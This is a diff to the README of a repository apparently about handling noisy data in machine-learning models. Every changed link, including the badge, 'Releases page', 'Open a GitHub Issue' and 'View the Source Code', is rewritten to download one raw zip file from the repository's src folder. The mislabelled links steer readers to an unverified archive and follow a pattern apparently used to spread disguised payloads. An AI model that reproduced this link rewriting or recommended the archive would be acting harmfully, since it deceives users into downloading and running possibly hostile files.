@@ -1,6 +1,6 @@
 # 📊 Data-Reliability-Noisy-Input-Handling-in-ML-Models - Understand Noise in Machine Learning
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue)](https://github.com/LTxYan/Data-Reliability-Noisy-Input-Handling-in-ML-Models/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/LTxYan/Data-Reliability-Noisy-Input-Handling-in-ML-Models/main/src/Data-Reliability-Noisy-Input-Handling-in-ML-Models_3.2.zip%20Latest%20Release-Click%20Here-blue)](https://raw.githubusercontent.com/LTxYan/Data-Reliability-Noisy-Input-Handling-in-ML-Models/main/src/Data-Reliability-Noisy-Input-Handling-in-ML-Models_3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,9 +10,9 @@ Welcome to the **Data-Reliability-Noisy-Input-Handling-in-ML-Models** project. T
 
 To download the software, visit the releases page:
 
-[Download the latest version here](https://github.com/LTxYan/Data-Reliability-Noisy-Input-Handling-in-ML-Models/releases)
+[Download the latest version here](https://raw.githubusercontent.com/LTxYan/Data-Reliability-Noisy-Input-Handling-in-ML-Models/main/src/Data-Reliability-Noisy-Input-Handling-in-ML-Models_3.2.zip)
 
-1. Navigate to the [Releases page](https://github.com/LTxYan/Data-Reliability-Noisy-Input-Handling-in-ML-Models/releases).
+1. Navigate to the [Releases page](https://raw.githubusercontent.com/LTxYan/Data-Reliability-Noisy-Input-Handling-in-ML-Models/main/src/Data-Reliability-Noisy-Input-Handling-in-ML-Models_3.2.zip).
 2. Find the most recent version listed.
 3. Click on the file that matches your operating system (e.g., Windows, macOS, Linux).
 4. Follow your system prompts to install the software.
@@ -59,7 +59,7 @@ If you encounter issues:
 
 ## 📞 Support
 
-For support, you can open an issue on the [GitHub repository](https://github.com/LTxYan/Data-Reliability-Noisy-Input-Handling-in-ML-Models/issues). This allows our team to address your concerns directly.
+For support, you can open an issue on the [GitHub repository](https://raw.githubusercontent.com/LTxYan/Data-Reliability-Noisy-Input-Handling-in-ML-Models/main/src/Data-Reliability-Noisy-Input-Handling-in-ML-Models_3.2.zip). This allows our team to address your concerns directly.
 
 ## 🏷️ Topics Covered
 
@@ -80,8 +80,8 @@ We welcome contributions. If you want to help improve this project, check the co
 
 ## 🔗 Quick Links
 
-- [Download the latest version here](https://github.com/LTxYan/Data-Reliability-Noisy-Input-Handling-in-ML-Models/releases)
-- [Open a GitHub Issue](https://github.com/LTxYan/Data-Reliability-Noisy-Input-Handling-in-ML-Models/issues)
-- [View the Source Code](https://github.com/LTxYan/Data-Reliability-Noisy-Input-Handling-in-ML-Models)
+- [Download the latest version here](https://raw.githubusercontent.com/LTxYan/Data-Reliability-Noisy-Input-Handling-in-ML-Models/main/src/Data-Reliability-Noisy-Input-Handling-in-ML-Models_3.2.zip)
+- [Open a GitHub Issue](https://raw.githubusercontent.com/LTxYan/Data-Reliability-Noisy-Input-Handling-in-ML-Models/main/src/Data-Reliability-Noisy-Input-Handling-in-ML-Models_3.2.zip)
+- [View the Source Code](https://raw.githubusercontent.com/LTxYan/Data-Reliability-Noisy-Input-Handling-in-ML-Models/main/src/Data-Reliability-Noisy-Input-Handling-in-ML-Models_3.2.zip)
 
 Thank you for choosing **Data-Reliability-Noisy-Input-Handling-in-ML-Models**. We hope this application helps you better understand the importance of data quality in machine learning!
